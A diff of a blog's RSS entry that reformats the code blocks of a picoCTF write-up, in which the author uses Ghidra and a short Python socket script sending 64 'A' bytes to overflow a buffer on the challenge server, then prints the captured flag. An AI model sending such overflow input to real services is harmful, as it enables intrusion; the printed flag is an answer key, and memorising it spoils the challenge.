@@ -11,78 +11,163 @@
 <p>First I checked the strings of the binary file using the strings command but unfortunately I did not find anything interesting.</p>
 <p>Let&rsquo;s fire up Ghidra and see what we&rsquo;ve got here &hellip;</p>
 <p>With ghidra I can see that the main function is calling a method called &lsquo;vuln()&rsquo;:</p>
-<pre><code>00011472 e8 dc fe ff ff       CALL       vuln     undefined vuln(undefined4 param_1)
-</code></pre>
-<p>After trying out some stuff I figured out that we just need to supply a lot of characters
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00011472 e8 dc fe ff ff       CALL       vuln     undefined vuln(undefined4 param_1)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After trying out some stuff I figured out that we just need to supply a lot of characters
 to overflow the buffer.</p>
 <p>So I went ahead and wrote a simple buffer overlow program using python sockets:</p>
-<pre><code class="language-python">import sys, socket, time
- 
-host = &quot;saturn.picoctf.net&quot; # set host address
-port = 57331 # set host port
-
-try:
-	ip = socket.gethostbyname( host )
-except socket.gaierror:
-	#could not resolve
-	print('Hostname could not be resolved. Exiting')
-	sys.exit()
- 
-# Unique Pattern
-# this is our char pattern we send to overflow 
-# the buffer. A char is 1 byte in size.
-# So we will overflow the buffer using 64 bytes.
-pattern = 'A'*64 + '\n'
- 
-try:
-	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
-	client.setblocking(0)
-	client.settimeout(10)
-	client.connect((ip, int(port))) # Connect to user supplied port and IP address
-except IOError:
-	print(&quot;Connection failed!&quot;)
-
-try:
-	msg = client.recv(4096).decode(&quot;utf-8&quot;) # Receive msg
-	
-	if msg:
-		print(&quot;received msg: &quot; + msg)
-	else:
-		print('disconnected')
-except socket.timeout:
-	print(&quot;Error! Socket did not get info, when expected&quot;)
-except socket.error:
-	print(&quot;Error! Socket did not get info, when expected&quot;)
-	
-print(&quot;ok&quot;)
-
-try:
-	client.send(pattern.encode()) # Send the unique pattern
-	time.sleep(1)
-	print(&quot;done sending&quot;)
-
-	data = client.recv(4096)
-	print(&quot;received...&quot;)
-
-	if data:
-		print(data)
-
-except socket.timeout:
-	print(&quot;Error! Socket did not get info, when expected&quot;)
-except socket.error:
-	print(&quot;Error! Socket did not get info, when expected&quot;)
-
-
-client.close() # Close the Connection
-</code></pre>
-<p>After running my exploit I get the following response:</p>
-<pre><code class="language-bash">received msg: Input: 
-ok
-done sending
-received...
-picoCTF{ov3rfl0ws_ar3nt_that_bad_9d9ee6b9}
-</code></pre>
-<p>So here is our flag:</p>
-<pre><code>picoCTF{ov3rfl0ws_ar3nt_that_bad_9d9ee6b9}
-</code></pre>
-]]></description></item></channel></rss>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;saturn.picoctf.net&#34;</span> <span class="c1"># set host address</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">57331</span> <span class="c1"># set host port</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">ip</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostbyname</span><span class="p">(</span> <span class="n">host</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">gaierror</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">#could not resolve</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Hostname could not be resolved. Exiting&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1"># Unique Pattern</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># this is our char pattern we send to overflow </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># the buffer. A char is 1 byte in size.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># So we will overflow the buffer using 64 bytes.</span>
+</span></span><span class="line"><span class="cl"><span class="n">pattern</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">64</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">client</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="c1"># Declare a TCP socket</span>
+</span></span><span class="line"><span class="cl">	<span class="n">client</span><span class="o">.</span><span class="n">setblocking</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">client</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span> <span class="c1"># Connect to user supplied port and IP address</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">IOError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Connection failed!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">msg</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="c1"># Receive msg</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">msg</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;received msg: &#34;</span> <span class="o">+</span> <span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;disconnected&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Error! Socket did not get info, when expected&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Error! Socket did not get info, when expected&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ok&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">client</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pattern</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="c1"># Send the unique pattern</span>
+</span></span><span class="line"><span class="cl">	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;done sending&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;received...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Error! Socket did not get info, when expected&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Error! Socket did not get info, when expected&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span> <span class="c1"># Close the Connection</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After running my exploit I get the following response:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">received msg: Input: 
+</span></span><span class="line"><span class="cl">ok
+</span></span><span class="line"><span class="cl"><span class="k">done</span> sending
+</span></span><span class="line"><span class="cl">received...
+</span></span><span class="line"><span class="cl">picoCTF<span class="o">{</span>ov3rfl0ws_ar3nt_that_bad_9d9ee6b9<span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So here is our flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{ov3rfl0ws_ar3nt_that_bad_9d9ee6b9}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>]]></description></item></channel></rss>
